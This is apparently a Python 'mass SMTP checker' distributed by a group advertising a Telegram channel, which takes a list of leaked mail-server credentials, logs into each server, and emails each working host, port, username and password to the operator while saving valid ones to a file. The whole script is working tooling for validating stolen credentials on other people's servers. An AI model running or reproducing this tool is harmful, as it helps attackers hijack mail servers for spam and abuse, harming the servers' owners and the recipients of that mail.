import smtplib, threading, os
from time import strftime
from colorama import Fore, Style, Back
bl = Fore.BLUE
wh = Fore.WHITE
gr = Fore.GREEN
bgr = Back.GREEN
sres = Style.RESET_ALL
RED = Fore.RED
def screen_clear():
  _ = os.system('cls||clear')

screen_clear()
print (f"    {gr}Leaked Shit.")
print (f"         {wh}MASS SMTP {bl}CHECKER")
print(f"           {bgr}  https://t.me/ViperZcRew {Style.RESET_ALL}")
address = input('Enter Your email adress :')
liists = input('Enter Your List :')
with open(liists) as f:
  for url in f:
    ur = url.rstrip()
    ch = ur.split('\n')[0].split('|')
    serveraddr = ch[0]
    toaddr = address
    fromaddr = ch[2]
    serverport = ch[1]
    smtp_user = ch[2]
    smtp_pass = ch[3]
    now = strftime("%Y-%m-%d %H:%M:%S")
    msg = "From: %s\r\nTo: %s\r\nSubject: ViperZCrew %s|%s|%s|%s\r\n\r\nTest message from laravel monster tool sent at %s" % (
    fromaddr, toaddr, serveraddr, serverport, smtp_user, smtp_pass, now)
    server = smtplib.SMTP()
    try:
      server.connect(serveraddr, serverport)
      server.login(smtp_user, smtp_pass)
      server.sendmail(fromaddr, toaddr, msg)
      print(f"{gr}(*) Working{sres} ===>  + {ur}")
      open('Valid_Smtp.txt', 'a').write(url + "\n")
      server.quit()
    except:
      print(f"{RED}[-] FAILED {sres}===>  + {ur}")
      pass